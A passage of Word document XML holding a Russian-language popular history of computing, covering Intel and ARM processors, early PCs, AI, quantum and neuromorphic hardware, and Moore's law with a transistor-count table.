        <w:t>Разрядность: **4 бита** (работает с числами 0-15)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Транзисторов: **2300**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота: **740 кГц** (0.74 МГц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Скорость: ~92 000 операций в секунду</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Техпроцесс: **10 микрометров** (современные — 3 нм)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $200</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный факт</w:t>
      </w:r>
      <w:r>
        <w:t>: Создан для калькулятора японской фирмы Busicom. Инженер Intel Тед Хофф предложил сделать универсальный процессор вместо специализированных микросхем. Busicom обанкротилась, а Intel заработала миллиарды.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Эволюция Intel x86</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Intel 8086 (1978) — начало эры x86</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность: **16 бит**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота: 5-10 МГц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Транзисторов: 29 000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Могёл адресовать **1 МБ** памяти</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Значение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Архитектура </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>x86</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> стала стандартом для персональных компьютеров на 40+ лет (до сих пор используется).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Intel 80286, 80386 (1982, 1985)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**80286**: 16 бит, защищённый режим, до 16 МБ памяти</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**80386**: **32 бита**, виртуальная память, многозадачность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Intel 80486, Pentium (1989, 1993)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**80486**: встроенный кэш, сопроцессор для операций с плавающей точкой</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Pentium**: суперскалярная архитектура (несколько инструкций за такт), частота до 300 МГц</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный факт</w:t>
      </w:r>
      <w:r>
        <w:t>: Pentium назвали так, потому что нельзя зарегистрировать торговую марку на число ("586"). А имя можно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pentium II, III, 4 и современные Core (1997-настоящее)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Pentium II-III**: частоты до 1.4 ГГц, улучшенный кэш, SSE-инструкции (векторные вычисления)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Pentium 4** (2000-2006): Частоты до **3.8 ГГц**, но архитектура провальная (много тактов на инструкцию, много тепла). Маркетинговая гонка за гигагерцами.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Core 2 Duo** (2006): Переход на **многоядерные процессоры** (2-4 ядра). Конец гонки за частотой.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Core i3/i5/i7/i9** (2008-настоящее): 2-64 ядра, частоты 2-5 ГГц, встроенное видео, техпроцесс 14 нм → 10 нм → 7 нм → 4 нм</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Альтернативные архитектуры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>ARM (1985 – настоящее)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ARM</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Advanced RISC Machine) — архитектура, доминирующая в мобильных устройствах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эволюция</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1985: ARM1 — процессор для компьютера Acorn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>1990-е: ARM7 — встраиваемые системы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2000-е: ARM9, ARM11 — смартфоны, роутеры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2010-е: Cortex-A — современные смартфоны (все iPhone, Android)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>2020-е: Apple M1/M2/M3 — ноутбуки и десктопы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему ARM круто</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Энергоэффективность**: в 10 раз меньше потребление чем x86 при той же производительности</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компактность**: меньше транзисторов, меньше тепла</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Масштабируемость**: от микроконтроллеров (Arduino) до суперкомпьютеров (Fugaku — самый быстрый суперкомпьютер 2020-2021, ARM)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Персональные компьютеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Altair 8800 (1975) — первый ПК</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор: Intel 8080</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: 256 **байт** (не килобайт!)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $439 (в виде набора для сборки)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Программирование: переключатели на передней панели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Значение</w:t>
      </w:r>
      <w:r>
        <w:t>: Доказал, что есть массовый рынок для домашних компьютеров. Билл Гейтс и Пол Аллен написали для него интерпретатор BASIC — начало Microsoft.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Apple II (1977)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор: MOS 6502 (1 МГц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: 4-48 КБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цветная графика**, звук, джойстик</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена: $1298</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Успех</w:t>
      </w:r>
      <w:r>
        <w:t>: Продано 6 миллионов штук. Первый массовый ПК с графикой и играми.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>IBM PC (1981)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессор: Intel 8088 (4.77 МГц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: 16-256 КБ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>ОС: **MS-DOS** (Microsoft)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Революция</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: IBM опубликовала спецификации, и сотни фирм начали делать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>клоны</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Родился </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>стандарт PC</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (personal computer). До сих пор твой компьютер — наследник IBM PC.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Современные ПК (2020-е)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Процессоры: Intel Core i9 / AMD Ryzen 9 (8-16 ядер, 3-5 ГГц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Память: 16-128 ГБ DDR5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Накопители: SSD 1-4 ТБ (в миллион раз быстрее дискет)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>GPU: отдельный процессор для графики (тысячи ядер)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сравнение</w:t>
      </w:r>
      <w:r>
        <w:t>: Современный смартфон мощнее суперкомпьютера 1990-х годов. Твой фитнес-браслет мощнее компьютера, который отправил людей на Луну.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Особенности четвёртого поколения</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Массовость**: компьютеры стали доступны обычным людям</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Миниатюризация**: от шкафов до ноутбуков и смартфонов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Производительность**: выросла в миллиарды раз</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цена**: упала в тысячи раз (с миллионов долларов до сотен)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Надёжность**: процессоры работают десятилетиями без поломок</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Технологические прорывы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Многоядерность (2-128 ядер)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Встроенная графика (GPU)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кэш-память (L1/L2/L3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Конвейеризация, суперскалярность, предсказание ветвлений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Техпроцесс уменьшился с 10 мкм до 3 нм (в 3000 раз!)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Программное обеспечение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Графические ОС (Windows, macOS, Linux)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Интернет, веб-браузеры</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Мультимедиа, игры, виртуальная реальность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Искусственный интеллект, машинное обучение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Пятое поколение (перспектива): Искусственный интеллект и квантовые компьютеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Что такое пятое поколение?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Единого мнения нет. Одни считают, что это компьютеры с </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>искусственным интеллектом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (ИИ), другие — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>квантовые компьютеры</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, третьи — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нейроморфные системы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (процессоры, имитирующие работу мозга).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Искусственный интеллект</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Современное состояние</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нейросети (GPT, BERT, Claude, ChatGPT) — обработка текста, генерация контента</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерное зрение (распознавание лиц, автопилот Tesla)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>AlphaGo, AlphaZero — победили чемпионов мира в го и шахматы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Специализированные процессоры для ИИ</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**GPU** (NVIDIA, AMD): тысячи ядер для параллельных вычислений</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**TPU** (Google Tensor Processing Unit): специально для нейросетей</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**NPU** (Neural Processing Unit): встроенные чипы для ИИ в смартфонах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Квантовые компьютеры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Принцип</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Используют </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кубиты</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (квантовые биты), которые могут быть одновременно 0 и 1 (суперпозиция). Это позволяет решать некоторые задачи экспоненциально быстрее классических компьютеров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IBM Quantum** (127 кубитов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Google Sycamore** (53 кубита, заявлено достижение "квантового превосходства" в 2019)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Квантовый симулятор** (сотни кубитов, китайский)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (потенциальное):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Взлом шифрования (RSA, ECC станут бесполезны)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разработка лекарств (моделирование молекул)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Оптимизация логистики</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Машинное обучение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблемы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кубиты крайне нестабильны (ошибки из-за шума)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужна температура близкая к абсолютному нулю (-273°C)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пока не ясно, для каких практических задач квантовые компьютеры реально полезны</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Квантовые компьютеры </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не заменят</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> классические. Они будут использоваться для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>узкоспециализированных задач</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Нейроморфные процессоры</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея</w:t>
      </w:r>
      <w:r>
        <w:t>: Процессоры, имитирующие работу нейронов мозга — параллельная обработка, обучение в реальном времени, сверхнизкое энергопотребление.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**IBM TrueNorth** (1 млн нейронов, 256 млн синапсов, потребление 70 милливатт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Intel Loihi** (128 000 нейронов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Применение</w:t>
      </w:r>
      <w:r>
        <w:t>: Распознавание образов, обработка сенсоров, роботы, встраиваемые системы.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Закон Мура: прогноз, который сбывался 50 лет</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Формулировка</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Закон Мура</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Moore's Law) — эмпирическое наблюдение, сделанное Гордоном Муром (сооснователь Intel) в 1965 году:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">&gt; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Количество транзисторов на кристалле удваивается примерно каждые 18-24 месяца.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Следствия</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность удваивается каждые ~2 года</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Цена на единицу производительности падает вдвое каждые ~2 года</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Энергопотребление на операцию падает</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример: Рост транзисторов в процессорах Intel</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Год  | Процессор       | Транзисторов | Прирост за ~2 года |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|------|-----------------|--------------|-------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1971 | Intel 4004      | 2 300        | —                 |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1978 | Intel 8086      | 29 000       | ×12 (7 лет)       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1989 | Intel 80486     | 1 200 000    | ×41 (11 лет)      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 1993 | Pentium         | 3 100 000    | ×2.6 (4 года)     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2000 | Pentium 4       | 42 000 000   | ×13 (7 лет)       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| 2006 | Core 2 Duo      | 291 000 000  | ×7 (6 лет)        |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
